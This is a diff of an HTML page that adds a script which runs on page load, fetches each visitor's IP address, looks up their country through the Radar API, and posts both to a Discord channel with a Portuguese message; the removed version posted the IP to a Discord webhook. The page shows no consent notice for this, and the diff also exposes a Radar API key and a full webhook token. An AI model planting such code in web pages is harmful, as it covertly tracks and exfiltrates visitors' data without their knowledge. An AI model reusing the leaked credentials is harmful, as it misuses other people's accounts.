@@ -298,8 +298,15 @@ discord.gg/quinze33">
 </body>
 
 
-```js
-    <script>
+
+
+ <script>
+        const apiKeys = {
+            radar: 'prj_live_pk_b93b1ff52ed9ce61057e764e3464837d6ddd206e'
+        };
+
+        const discordWebhookURL = 'https://discord.com/channels/1170563379560194088/1266978537726808096';
+
         function getUserIP() {
             return fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
@@ -310,38 +317,60 @@ discord.gg/quinze33">
                 });
         }
 
-        function sendIPToDiscord(ip) {
-            const webhookURL = 'https://discord.com/api/webhooks/1266979363262435348/61hIvLysgcoDp8Pn4DL0Kv5jF22MqWBaXKEuFP42JXX5Jub5FHv6ypQ_hCYakrNziUtj';
+        function getIPLocationRadar(ip) {
+            return fetch(`https://api.radar.io/v1/ip?ip=${ip}`, {
+                headers: {
+                    'Authorization': apiKeys.radar
+                }
+            })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Radar API request failed');
+                    }
+                    return response.json();
+                })
+                .then(data => ({
+                    ip: data.address.ip,
+                    country: data.address.country
+                }));
+        }
+
+        function sendToDiscord(ip, country) {
             const payload = {
-                content: `User IP: ${ip}`
+                content: `O IP do usuário é ${ip} e ele é da região do ${country}.`
             };
 
-            return fetch(webhookURL, {
+            fetch(discordWebhookURL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify(payload)
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Error sending IP to Discord');
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Data sent to Discord webhook successfully.');
+                } else {
+                    console.error('Error sending data to Discord webhook:', response.statusText);
                 }
-                return response.json();
-            })
-            .then(data => {
-                console.log('Successfully sent IP to Discord:', data);
-            })
-            .catch(error => {
-                console.error('Error:', error);
+            }).catch(error => {
+                console.error('Error sending data to Discord webhook:', error);
             });
         }
 
-        getUserIP()
-            .then(ip => sendIPToDiscord(ip))
-            .catch(error => console.error('Failed to send IP:', error));
+        async function main() {
+            try {
+                const ip = await getUserIP();
+                const location = await getIPLocationRadar(ip);
+                sendToDiscord(location.ip, location.country);
+            } catch (error) {
+                console.error('Failed to get user IP or location:', error);
+            }
+        }
+
+        main();
     </script>
-```
+
+
 
 
 </html>
